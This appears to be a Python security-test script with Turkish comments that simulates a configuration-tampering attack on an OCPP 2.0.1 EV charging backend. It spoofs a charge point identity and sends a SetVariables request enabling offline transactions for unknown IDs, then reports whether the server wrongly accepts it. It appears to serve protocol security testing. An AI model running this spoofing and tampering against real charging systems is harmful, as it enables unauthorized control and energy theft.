import json
import uuid
import asyncio
import websockets
import logging
import traceback
from datetime import datetime, timezone
# Enum'ları kullanmak yerine, kütüphane hatalarını önlemek için doğrudan string değerler gönderiyoruz.

# --- LOGGING AYARLARI ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | [SET_TAMPERING] | %(message)s'
)

# --- HEDEF ORTAM AYARLARI ---
SPOOFED_CP_ID = "CP_TEST"
CSMS_WEBSOCKET_URL = f"ws://127.0.0.1:9000/{SPOOFED_CP_ID}"

# --- ANOMALİ PARAMETRELERİ ---
CRITICAL_CV_TO_SET = "OfflineTxForUnknownIdEnabled"
TARGET_VALUE = "true" # OCPP boolean değerleri string olarak gönderilir.

# --- OCPP MESAJ YAPILARI ---

def create_boot_notification_request():
    """CSMS'e meşru CP olarak bağlanırken gönderilen ilk mesajı oluşturur."""
    message_id = str(uuid.uuid4())
    payload = {
        "reason": "PowerUp",
        "chargingStation": {
            "model": "SetTamperCP", # Protokol kısıtlamasına uygun kısa isim
            "vendorName": "AttackerVendor"
        }
    }
    return [2, message_id, "BootNotification", payload]


def create_set_variables_request(variable_name, value):
    """CP'de konfigürasyon değişkeni ayarlamayı talep eden SetVariables mesajını oluşturur (B05 UC)."""
    message_id = str(uuid.uuid4())

    set_data = [{
        "attributeType": "Actual", # Gerçek değeri değiştir
        "component": {
            "name": "Security", # Varsayılan güvenlik bileşeni
        },
        "variable": {
            "name": variable_name
        },
        "value": value # Hedeflenen yeni değer: "true"
    }]

    payload = {
        "setVariableData": set_data
    }
    # [2, MessageId, Action: "SetVariables", Payload]
    return [2, message_id, "SetVariables", payload]


async def send_message_and_wait_response(websocket, message, timeout=10):
    """Mesaj gönder ve yanıt bekle (yardımcı fonksiyon)"""
    try:
        await websocket.send(json.dumps(message))
        response_raw = await asyncio.wait_for(websocket.recv(), timeout=timeout)
        response = json.loads(response_raw)
        return response
    except asyncio.TimeoutError:
        logging.warning(f"⏱️ Timeout: {message[2]} için yanıt gelmedi")
        return None
    except Exception as e:
        logging.error(f"❌ Mesaj gönderme hatası: {e}")
        return None


async def attack_simulation():
    """Kritik Konfigürasyon Manipülasyonu saldırı simülasyonu"""

    logging.info("=" * 75)
    logging.info("🚨 KONFİGÜRASYON TAMPERING SALDIRISI BAŞLATILIYOR (SetVariables)")
    logging.info("=" * 75)
    logging.info(f"🎯 Hedef CV: {CRITICAL_CV_TO_SET} (Hile Kapısı)")
    logging.info(f"🎭 Sahte CP Kimliği: {SPOOFED_CP_ID}")
    logging.info("=" * 75)

    try:
        # === AŞAMA 1 & 2: CSMS'E BAĞLANMA VE BOOT NOTIFICATION ===
        logging.info("📡 CSMS'e bağlanılıyor ve kimlik sahteciliği yapılıyor...")

        async with websockets.connect(CSMS_WEBSOCKET_URL, subprotocols=['ocpp2.0.1']) as websocket:
            logging.info("✅ WebSocket bağlantısı başarılı")

            boot_msg = create_boot_notification_request()
            boot_response = await send_message_and_wait_response(websocket, boot_msg)

            if not boot_response or boot_response[0] != 3:
                logging.error("❌ BootNotification başarısız!")
                return

            payload = boot_response[2]
            if isinstance(payload, str):
                payload = json.loads(payload)

            status = payload.get('status')
            logging.info(f"✅ BootNotification kabul edildi: {status}")

            await asyncio.sleep(1)

            # === AŞAMA 3: SET VARIABLES SALDIRISI (TAMPERING) ===
            logging.warning("=" * 75)
            logging.warning("💣 KRİTİK ADIM: SetVariables ile Konfigürasyon Değişimi Gönderiliyor!")
            logging.warning(f"⚠️ Hedef: {CRITICAL_CV_TO_SET} -> {TARGET_VALUE}")
            logging.warning("=" * 75)

            set_vars_msg = create_set_variables_request(CRITICAL_CV_TO_SET, TARGET_VALUE)

            # CSMS'ten beklenen yanıt, bu isteği CP'ye iletmesidir.
            set_response = await send_message_and_wait_response(websocket, set_vars_msg)

            # === SONUÇ DEĞERLENDİRMESİ ===
            if set_response:
                message_type = set_response[0]

                if message_type == 3: # CallResult (CSMS isteği kabul edip CP'ye iletti.)
                    logging.error("❌❌❌ GÜVENLİK AÇIĞI TESPİT EDİLDİ! ❌❌❌")
                    logging.error("🚨 CSMS, YETKİSİZ SetVariables isteğini kabul edip CP'ye iletti!")
                    logging.error("CP'nin SetVariables handler'ı bu değeri değiştirirse, saldırı başarılıdır.")
                    logging.error("💥 POTANSİYEL ETKİ: Çevrimdışı Moda Geçiş ve Enerji Hilesi (Yetki Yükseltme).")
                    logging.error("🔴 Test Case TC-Set: BAŞARISIZ (Güvenlik Açığı Mevcut)")

                elif message_type == 4: # CallError (CSMS isteği reddetti.)
                    error_code = set_response[2]
                    error_desc = set_response[3]

                    logging.info("=" * 75)
                    logging.info("✅✅✅ GÜVENLİK TESTİ BAŞARILI! ✅✅✅")
                    logging.info("🛡️ CSMS, SetVariables isteğini doğru bir şekilde reddetti.")
                    logging.info(f"   Hata Kodu: {error_code}")
                    logging.info(f"   Açıklama: {error_desc}")
                    logging.info("✅ Konfigürasyon bütünlüğü korunuyor.")
                    logging.info("=" * 75)
                else:
                    logging.warning("⚠️ CSMS'ten beklenmeyen bir yanıt türü geldi.")
            else:
                logging.warning("⚠️ CSMS'ten yanıt alınamadı (Timeout).")

            logging.info("🏁 SALDIRI SİMÜLASYONU TAMAMLANDI")

    except websockets.exceptions.ConnectionClosedOK:
        logging.info("✅ Bağlantı normal şekilde kapandı")
    except Exception as e:
        logging.error(f"❌ Beklenmeyen hata: {e}")
        logging.error(traceback.format_exc())


if __name__ == "__main__":
    asyncio.run(attack_simulation())